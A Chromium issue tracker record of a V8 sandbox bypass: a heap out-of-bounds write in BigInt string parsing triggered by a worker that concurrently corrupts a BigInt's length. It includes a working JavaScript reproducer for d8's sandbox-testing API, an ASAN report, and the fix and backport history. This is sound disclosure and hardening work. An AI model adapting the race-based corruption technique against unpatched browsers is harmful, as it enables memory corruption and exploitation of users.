# V8 Sandbox Bypass: OOB write in bigint::ProcessorImpl::FromStringLarge

| Field | Value |
|-------|-------|
| **Issue ID** | [427600180](https://issues.chromium.org/issues/427600180) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink>JavaScript, Blink>JavaScript>Runtime |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | vs...@gmail.com |
| **Assignee** | jk...@chromium.org |
| **Created** | 2025-06-25 |
| **Bounty** | $5,000.00 |

## Description

#### VULNERABILITY DETAILS

When converting a string of a particular size into a `BigInt`, a heap OOB write can be triggered by changing the length of the result `BigInt` during processing.

The following code is initially executed when converting a string to a `BigInt` ([link](https://source.chromium.org/chromium/chromium/src/+/main:v8/src/objects/bigint.cc;drc=feaf4438bcf1f96868820e62254495bfa46d3ea0;l=1186))

```
BigInt::Allocate
MaybeHandle<BigInt> BigInt::Allocate(IsolateT* isolate,
                                     bigint::FromStringAccumulator* accumulator,
                                     bool negative, AllocationType allocation) {
  uint32_t digits = accumulator->ResultLength();
  DCHECK_LE(digits, kMaxLength);
  // <----- Here, the resulting BigInt is allocated on the heap.
  Handle<MutableBigInt> result =
      MutableBigInt::New(isolate, digits, allocation).ToHandleChecked();
  // Here, rw_digits() reads the length of `result` from the heap.
  // The provided reproducer changed the size between this line and the line above.
  // We replace the length of the new rw_digits with a length value
  // smaller than the one of `result` 
  bigint::Status status =
      isolate->bigint_processor()->FromString(result->rw_digits(), accumulator);
  <...>
}

```

Eventually, we end up in the `ProcessorImpl::FromStringLarge` function, provided with the `rw_digits` from above as `Z` and the `accumulator`.

The function contains the following precondition checks:

```
void ProcessorImpl::FromStringLarge(RWDigits Z,
                                    FromStringAccumulator* accumulator) {
  int num_parts = static_cast<int>(accumulator->heap_parts_.size());
  DCHECK(num_parts >= 2);
  // We violate this by our mutation since we changed the length of `Z` being < than
  // the length of `accumulator`.
  DCHECK(Z.len() >= num_parts);

```

I don't know why this triggered the OOB write further below. However, I attached a reproducer that is working on the current head.

Also, I noticed that the debug checks in the `BigInt` code (namely `BIGINT_H_DCHECK` and `DCHECK`) are enabled, even if built with `dcheck_always_on=false`. This may shadow actual bugs if fuzzing a debug build for whatever reason.

#### VERSION

V8 Git Commit: 8eb6cba8e5afc6513042f5ea3da82973da0183c5 (Wed Jun 25 14:01:33 2025 +0200)

#### REPRODUCTION CASE

The reproducer may take some seconds to trigger the bug.

```
d8 --fuzzing --sandbox-fuzzing --allow-natives-syntax --expose-gc bug.js

```
```
let sbx_mem = new DataView(new Sandbox.MemoryView(0, 0x500000000));

function randomNumericString(n) {
    let digits = new Array(n);
    digits[0] = Math.floor(Math.random() * 9) + 1;
    for (let i = 1; i < n; i++) {
        digits[i] = Math.floor(Math.random() * 10);
    }
    return digits.join('');
}

function corruptInBackground(address) {

    function workerTemplate(address) {
        let sbx_mem = new DataView(new Sandbox.MemoryView(0, 0x500000000));
        let switch_val = false;
        while(true) {
            switch_val = !switch_val;
            if (switch_val) {
                sbx_mem.setUint32(address, 0x00000cba, true);
            } else {
                sbx_mem.setUint32(address, 0x600, true);
            }
        }
    }
    const workerCode = new Function(
        `(${workerTemplate})(${address})`);
    return new Worker(workerCode, { type: 'function' });
}


gc();
gc();

let numStr = randomNumericString(30946);
let started = false;

while(true) {
    gc();
    gc();

    let big = BigInt(numStr);
    let big_addr = Sandbox.getAddressOf(big);
    if (!started) {
        started = true;
        corruptInBackground(big_addr + 4);
    }
}

```

**ASAN Report**

```
==3811987==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7e6ff71843ef at pc 0x555559327e98 bp 0x7fffffffd4a0 sp 0x7fffffffd498
WRITE of size 16 at 0x7e6ff71843ef thread T0
    #0 0x555559327e97 in operator= src/bigint/bigint.h:162:37
    #1 0x555559327e97 in v8::bigint::ProcessorImpl::FromStringLarge(v8::bigint::RWDigits, v8::bigint::FromStringAccumulator*) src/bigint/fromstring.cc:177:24
    #2 0x55555932938d in v8::bigint::Processor::FromString(v8::bigint::RWDigits, v8::bigint::FromStringAccumulator*) src/bigint/fromstring.cc:328:9
    #3 0x555557703aa8 in v8::internal::MaybeHandle<v8::internal::BigInt> v8::internal::BigInt::Allocate<v8::internal::Isolate>(v8::internal::Isolate*, v8::bigint::FromStringAccumulator*, bool, v8::internal::AllocationType) src/objects/bigint.cc:1197:36
    #4 0x5555576d85e0 in v8::internal::StringToBigInt(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::String>) src/numbers/conversions.cc:1109:17
    #5 0x5555577035bd in T<v8::internal::BigInt>::MaybeType v8::internal::BigInt::FromObject<v8::internal::Handle>(v8::internal::Isolate*, T<v8::internal::Object>) src/objects/bigint.cc:985:10
    #6 0x555556c98577 in v8::internal::Builtin_Impl_BigIntConstructor(v8::internal::BuiltinArguments, v8::internal::Isolate*) src/builtins/builtins-bigint.cc:37:5
    #7 0x55555b3f95f5 in Builtins_CEntry_Return1_ArgvOnStack_BuiltinExit setup-isolate-deserialize.cc
    #8 0x55555b34f774 in Builtins_InterpreterEntryTrampoline setup-isolate-deserialize.cc
    #9 0x55555b34c51b in Builtins_JSEntryTrampoline setup-isolate-deserialize.cc
    #10 0x55555b34c26a in Builtins_JSEntry setup-isolate-deserialize.cc
    #11 0x555556f7ed2b in Call src/execution/simulator.h:212:12
    #12 0x555556f7ed2b in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, v8::internal::(anonymous namespace)::InvokeParams const&) src/execution/execution.cc:442:22
    #13 0x555556f802e8 in v8::internal::Execution::CallScript(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSFunction>, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::DirectHandle<v8::internal::Object>) src/execution/execution.cc:542:10
    #14 0x555556bfd1a7 in v8::Script::Run(v8::Local<v8::Context>, v8::Local<v8::Data>) src/api/api.cc:1968:7
    #15 0x555556857aa2 in v8::Shell::ExecuteString(v8::Isolate*, v8::Local<v8::String>, v8::Local<v8::String>, v8::Shell::ReportExceptions, v8::Global<v8::Value>*) src/d8/d8.cc:1033:44
    #16 0x555556889973 in v8::SourceGroup::Execute(v8::Isolate*) src/d8/d8.cc:5329:10
    #17 0x55555689469c in v8::Shell::RunMainIsolate(v8::Isolate*, bool) src/d8/d8.cc:6281:37
    #18 0x555556893d66 in v8::Shell::RunMain(v8::Isolate*, bool) src/d8/d8.cc:6189:18
    #19 0x555556896ed8 in v8::Shell::Main(int, char**) src/d8/d8.cc:7056:18
    #20 0x7ffff7c8c1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #21 0x7ffff7c8c28a in __libc_start_main csu/../csu/libc-start.c:360:3
    #22 0x55555674f029 in _start (/work/v8-build-vanilla/v8/out/vanilla/d8+0x11fb029) (BuildId: 28bbbc7157f38fd2)

0x7e6ff71843ef is located 7 bytes after 13032-byte region [0x7e6ff7181100,0x7e6ff71843e8)
allocated by thread T0 here:
    #0 0x555556829a6d in operator new[](unsigned long) /b/s/w/ir/cache/builder/src/third_party/llvm/compiler-rt/lib/asan/asan_new_delete.cpp:89:3
    #1 0x55555932543c in Storage src/bigint/bigint-internal.h:140:43
    #2 0x55555932543c in v8::bigint::ProcessorImpl::FromStringLarge(v8::bigint::RWDigits, v8::bigint::FromStringAccumulator*) src/bigint/fromstring.cc:95:11
    #3 0x55555932938d in v8::bigint::Processor::FromString(v8::bigint::RWDigits, v8::bigint::FromStringAccumulator*) src/bigint/fromstring.cc:328:9
    #4 0x555557703aa8 in v8::internal::MaybeHandle<v8::internal::BigInt> v8::internal::BigInt::Allocate<v8::internal::Isolate>(v8::internal::Isolate*, v8::bigint::FromStringAccumulator*, bool, v8::internal::AllocationType) src/objects/bigint.cc:1197:36
    #5 0x5555576d85e0 in v8::internal::StringToBigInt(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::String>) src/numbers/conversions.cc:1109:17
    #6 0x5555577035bd in T<v8::internal::BigInt>::MaybeType v8::internal::BigInt::FromObject<v8::internal::Handle>(v8::internal::Isolate*, T<v8::internal::Object>) src/objects/bigint.cc:985:10
    #7 0x555556c98577 in v8::internal::Builtin_Impl_BigIntConstructor(v8::internal::BuiltinArguments, v8::internal::Isolate*) src/builtins/builtins-bigint.cc:37:5
    #8 0x55555b3f95f5 in Builtins_CEntry_Return1_ArgvOnStack_BuiltinExit setup-isolate-deserialize.cc
    #9 0x55555b34f774 in Builtins_InterpreterEntryTrampoline setup-isolate-deserialize.cc
    #10 0x55555b34c51b in Builtins_JSEntryTrampoline setup-isolate-deserialize.cc
    #11 0x55555b34c26a in Builtins_JSEntry setup-isolate-deserialize.cc
    #12 0x555556f7ed2b in Call src/execution/simulator.h:212:12
    #13 0x555556f7ed2b in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, v8::internal::(anonymous namespace)::InvokeParams const&) src/execution/execution.cc:442:22
    #14 0x555556f802e8 in v8::internal::Execution::CallScript(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSFunction>, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::DirectHandle<v8::internal::Object>) src/execution/execution.cc:542:10
    #15 0x555556bfd1a7 in v8::Script::Run(v8::Local<v8::Context>, v8::Local<v8::Data>) src/api/api.cc:1968:7
    #16 0x555556857aa2 in v8::Shell::ExecuteString(v8::Isolate*, v8::Local<v8::String>, v8::Local<v8::String>, v8::Shell::ReportExceptions, v8::Global<v8::Value>*) src/d8/d8.cc:1033:44
    #17 0x555556889973 in v8::SourceGroup::Execute(v8::Isolate*) src/d8/d8.cc:5329:10
    #18 0x55555689469c in v8::Shell::RunMainIsolate(v8::Isolate*, bool) src/d8/d8.cc:6281:37
    #19 0x555556893d66 in v8::Shell::RunMain(v8::Isolate*, bool) src/d8/d8.cc:6189:18
    #20 0x555556896ed8 in v8::Shell::Main(int, char**) src/d8/d8.cc:7056:18
    #21 0x7ffff7c8c1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #22 0x7ffff7c8c28a in __libc_start_main csu/../csu/libc-start.c:360:3
    #23 0x55555674f029 in _start (/work/v8-build-vanilla/v8/out/vanilla/d8+0x11fb029) (BuildId: 28bbbc7157f38fd2)

SUMMARY: AddressSanitizer: heap-buffer-overflow src/bigint/bigint.h:162:37 in operator=
Shadow bytes around the buggy address:
  0x7e6ff7184100: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7e6ff7184180: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7e6ff7184200: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7e6ff7184280: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7e6ff7184300: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x7e6ff7184380: 00 00 00 00 00 00 00 00 00 00 00 00 00[fa]fa fa
  0x7e6ff7184400: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x7e6ff7184480: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x7e6ff7184500: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x7e6ff7184580: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x7e6ff7184600: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==3811987==ABORTING

## V8 sandbox violation detected!

```

## Timeline

### cl...@appspot.gserviceaccount.com (2025-06-25)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=6532163511975936.

### ca...@chromium.org (2025-06-26)

Trying CF again with the memory corruption api enabled

### cl...@appspot.gserviceaccount.com (2025-06-26)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=6090587623063552.

### 24...@project.gserviceaccount.com (2025-06-26)

Automatically applying components based on crash stacktrace and information from OWNERS files.

If this is incorrect, please apply the hotlistid:4801165.

### 24...@project.gserviceaccount.com (2025-06-26)

Detailed Report: https://clusterfuzz.com/testcase?key=6090587623063552

Fuzzer: None
Job Type: linux_asan_d8_sandbox_testing
Platform Id: linux

Crash Type: V8 sandbox violation
Crash Address: 0x7994e7f09be8
Crash State:
  v8::bigint::RWDigits::WritableDigitReference::operator=
  v8::bigint::ProcessorImpl::FromStringLarge
  v8::bigint::Processor::FromString
  
Sanitizer: address (ASAN)

Crash Revision: https://clusterfuzz.com/revisions?job=linux_asan_d8_sandbox_testing&revision=101071

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=6090587623063552

To reproduce this, please build the target in this report and run it against the reproducer testcase. Please use the GN arguments provided at bottom of this report when building the binary. 

If you have trouble reproducing, please also export the environment variables listed under "[Environment]" in the crash stacktrace.

If you have any feedback on reproducing test cases, let us know at https://forms.gle/Yh3qCYFveHj6E5jz5 so we can improve.


### ca...@chromium.org (2025-06-26)

Triaging as a  valid V8 sandbox bypass, passing to the V8 sheriff for further triage

### cf...@google.com (2025-06-27)

jkummerow@, could you PTAL?

### ch...@google.com (2025-06-27)

Setting Priority to P2 to match Severity s3. If this is incorrect, please reset the priority. The automation bot account won't make this change again.

### jk...@chromium.org (2025-06-27)

FWIW, with a non-ASan build, I usually get

```
double free or corruption (out)
Caught harmless signal (SIGABRT). Exiting process...

```

and sometimes

```
Caught harmless memory access violation (inside sandbox address space). Exiting process...

```

or

```
malloc(): invalid size (unsorted)
Caught harmless signal (SIGABRT). Exiting process...

```

So I'm not sure if this is exploitable. That said, this code is certainly less robust towards concurrent corruption than it could be. I'll upload a fix.

### sa...@chromium.org (2025-06-30)

Here the libc/malloc hardening is catching the memory corruption too late to be useful as a mitigation, and also that would only affect Linux builds, so yeah, we should assume that this is exploitable :)

Maybe one broader question is whether we could switch the BigInt code to allocate temporary buffers inside the sandbox and if that would've mitigated this issue without introducing other problems (e.g. we must only allocate trivial objects and arrays inside the sandbox, in particular nothing that contains pointers). If we could do that, it might allow the bigint code to eventually run in [sandboxed executin mode](https://source.chromium.org/chromium/chromium/src/+/main:v8/src/sandbox/code-sandboxing-mode.h;l=27;drc=8993d4b0c376ece145995d7604d3b97f7d33e38e) which would give us some guarantees that e.g. (virtually all) buffer overflows and use-after-frees wouldn't be exploitable (because they would always only corrupt more in-sandbox memory).

### dx...@google.com (2025-06-30)

Project: v8/v8  

Branch: main  

Author: Jakob Kummerow [jkummerow@chromium.org](mailto:jkummerow@chromium.org)  

Link:      <https://chromium-review.googlesource.com/6680320>

[bigint][sandbox] Harden FromString against concurrent mutation

---


Expand for full commit details
```
     
    The {FromStringLarge} implementation uses the allocated result as 
    temporary storage at first. This algorithm crucially relies on that 
    result having the right size. We do allocate it with the right size, 
    but a concurrent mutator could immediately muck with it; so guard 
    against that with a CHECK. 
     
    Fixed: 427600180 
    Change-Id: I19366ae8562aefd21af1d850df4155c016cdb904 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/6680320 
    Reviewed-by: Samuel Groß <saelo@chromium.org> 
    Auto-Submit: Jakob Kummerow <jkummerow@chromium.org> 
    Commit-Queue: Jakob Kummerow <jkummerow@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#101119}

```

---

Files:

- M `src/bigint/fromstring.cc`

---

Hash: eba18128c11f33badbdf79bc03dc6489a528f537  

Date:  Fri Jun 27 17:09:17 2025


---

### ch...@google.com (2025-06-30)

Setting milestone because of s2 severity.

### ch...@google.com (2025-06-30)

Security Merge Request Consideration: This is sufficiently serious that it should be merged to beta. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M139. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
Security Merge Request - Manual Review: Merge review required: no relevant commits could be automatically detected (via Git Watcher comments), sending to merge review for manual evaluation. If you have not already manually listed the relevant commits to be merged via a comment above, please do so ASAP.

Security Merge Request: Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

We have determined this fix is necessary on milestone(s): [139].

Please answer the following questions so that we can safely process this merge request:

1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been verified on Canary to not pose any stability regressions?
3. Does this fix pose any potential non-verifiable stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.
6. (no answer required) Please check the OS custom field to ensure all impacted OSes are checked!

### am...@chromium.org (2025-07-02)

139 Beta merge approved for https://crrev.com/c/6680320, please merge to 13.9 at your earliest convenience 

### sp...@google.com (2025-07-02)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $5000.00 for this report.

Rationale for this decision:
report of V8 sandbox bypass demonstrating memory corruption outside the V8 heap sandbox


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
Please contact security-vrp@chromium.org with any questions.

### am...@chromium.org (2025-07-02)

Thanks for your efforts hunting in the V8 sandbox! 

### dx...@google.com (2025-07-04)

Project: v8/v8  

Branch: refs/branch-heads/13.9  

Author: Jakob Kummerow [jkummerow@chromium.org](mailto:jkummerow@chromium.org)  

Link:      <https://chromium-review.googlesource.com/6700246>

Merged: [bigint][sandbox] Harden FromString against concurrent mutation

---


Expand for full commit details
```
     
    The {FromStringLarge} implementation uses the allocated result as 
    temporary storage at first. This algorithm crucially relies on that 
    result having the right size. We do allocate it with the right size, 
    but a concurrent mutator could immediately muck with it; so guard 
    against that with a CHECK. 
     
    Fixed: 427600180 
    (cherry picked from commit eba18128c11f33badbdf79bc03dc6489a528f537) 
     
    Change-Id: Ieff335c9b636d159a689d09547b826f1380c58c3 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/6700246 
    Commit-Queue: Jakob Kummerow <jkummerow@chromium.org> 
    Commit-Queue: Matthias Liedtke <mliedtke@chromium.org> 
    Auto-Submit: Jakob Kummerow <jkummerow@chromium.org> 
    Reviewed-by: Matthias Liedtke <mliedtke@chromium.org> 
    Cr-Commit-Position: refs/branch-heads/13.9@{#12} 
    Cr-Branched-From: 76ea4091129171336d347c2624f6062bd9708042-refs/heads/13.9.205@{#1} 
    Cr-Branched-From: 28242121f590fe04758efec176658cd57310b297-refs/heads/main@{#100941}

```

---

Files:

- M `src/bigint/fromstring.cc`

---

Hash: 654448fed90fa20e6203118a4b0859f4cd446757  

Date:  Fri Jun 27 17:09:17 2025


---

### pe...@google.com (2025-07-04)

LTS Milestone M132

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:

1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?

### pe...@google.com (2025-07-10)

This issue requires additional review before it can be merged to the LTS channel. Please answer the following questions to help us evaluate this merge:

1. Number of CLs needed for this fix and links to them.
2. Level of complexity (High, Medium, Low - Explain)
3. Has this been merged to a stable release? beta release?
4. Overall Recommendation (Yes, No)

### qk...@google.com (2025-07-11)

1. https://chromium-review.googlesource.com/c/v8/v8/+/6712495
2. Low - There was no conflict.
3. 139
4. Yes. 

### rz...@google.com (2025-09-16)

Answers for 138:

1. <https://crrev.com/c/6937656>
2. Low, no conflicts
3. 139
4. Yes

### dx...@google.com (2025-09-18)

Project: v8/v8  

Branch:  refs/branch-heads/13.8  

Author:  Jakob Kummerow [jkummerow@chromium.org](mailto:jkummerow@chromium.org)  

Link:    <https://chromium-review.googlesource.com/6937656>

[M138-LTS][bigint][sandbox] Harden FromString against concurrent mutation

---


Expand for full commit details
```
     
    The {FromStringLarge} implementation uses the allocated result as 
    temporary storage at first. This algorithm crucially relies on that 
    result having the right size. We do allocate it with the right size, 
    but a concurrent mutator could immediately muck with it; so guard 
    against that with a CHECK. 
     
    (cherry picked from commit eba18128c11f33badbdf79bc03dc6489a528f537) 
     
    Fixed: 427600180 
    Change-Id: I19366ae8562aefd21af1d850df4155c016cdb904 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/6680320 
    Auto-Submit: Jakob Kummerow <jkummerow@chromium.org> 
    Commit-Queue: Jakob Kummerow <jkummerow@chromium.org> 
    Cr-Original-Commit-Position: refs/heads/main@{#101119} 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/6937656 
    Reviewed-by: Clemens Backes <clemensb@chromium.org> 
    Commit-Queue: Roger Felipe Zanoni da Silva (xWF) <rzanoni@google.com> 
    Reviewed-by: Jakob Kummerow <jkummerow@chromium.org> 
    Cr-Commit-Position: refs/branch-heads/13.8@{#68} 
    Cr-Branched-From: 61ddd471ece346840bbebbb308dceb4b4ce31b28-refs/heads/13.8.258@{#1} 
    Cr-Branched-From: fdb5de2c741658e94944f2ec1218530e98601c23-refs/heads/main@{#100480}

```

---

Files:

- M `src/bigint/fromstring.cc`

---

Hash: [f562c4aee61074451d176ace42d2bbb33840b2e5](https://chromiumdash.appspot.com/commit/f562c4aee61074451d176ace42d2bbb33840b2e5)  

Date: Fri Jun 27 17:09:17 2025


---

### dx...@google.com (2025-09-18)

Project: v8/v8  

Branch:  refs/branch-heads/13.2  

Author:  Jakob Kummerow [jkummerow@chromium.org](mailto:jkummerow@chromium.org)  

Link:    <https://chromium-review.googlesource.com/6712495>

[M132-LTS][bigint][sandbox] Harden FromString against concurrent mutation

---


Expand for full commit details
```
     
    The {FromStringLarge} implementation uses the allocated result as 
    temporary storage at first. This algorithm crucially relies on that 
    result having the right size. We do allocate it with the right size, 
    but a concurrent mutator could immediately muck with it; so guard 
    against that with a CHECK. 
     
    (cherry picked from commit eba18128c11f33badbdf79bc03dc6489a528f537) 
     
    Fixed: 427600180 
    Change-Id: I19366ae8562aefd21af1d850df4155c016cdb904 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/6680320 
    Reviewed-by: Samuel Groß <saelo@chromium.org> 
    Auto-Submit: Jakob Kummerow <jkummerow@chromium.org> 
    Commit-Queue: Jakob Kummerow <jkummerow@chromium.org> 
    Cr-Original-Commit-Position: refs/heads/main@{#101119} 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/6712495 
    Reviewed-by: Jakob Kummerow <jkummerow@chromium.org> 
    Reviewed-by: Leszek Swirski <leszeks@chromium.org> 
    Commit-Queue: Gyuyoung Kim (xWF) <qkim@google.com> 
    Cr-Commit-Position: refs/branch-heads/13.2@{#106} 
    Cr-Branched-From: 24068c59cedad9ee976ddc05431f5f497b1ebd71-refs/heads/13.2.152@{#1} 
    Cr-Branched-From: 6054ba94db0969220be4f94dc1677fc4696bdc4f-refs/heads/main@{#97085}

```

---

Files:

- M `src/bigint/fromstring.cc`

---

Hash: [725b6a21ca7f49eb07827559dbf4cda60c470a85](https://chromiumdash.appspot.com/commit/725b6a21ca7f49eb07827559dbf4cda60c470a85)  

Date: Fri Jun 27 17:09:17 2025


---

### ch...@google.com (2025-10-07)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/427600180)*
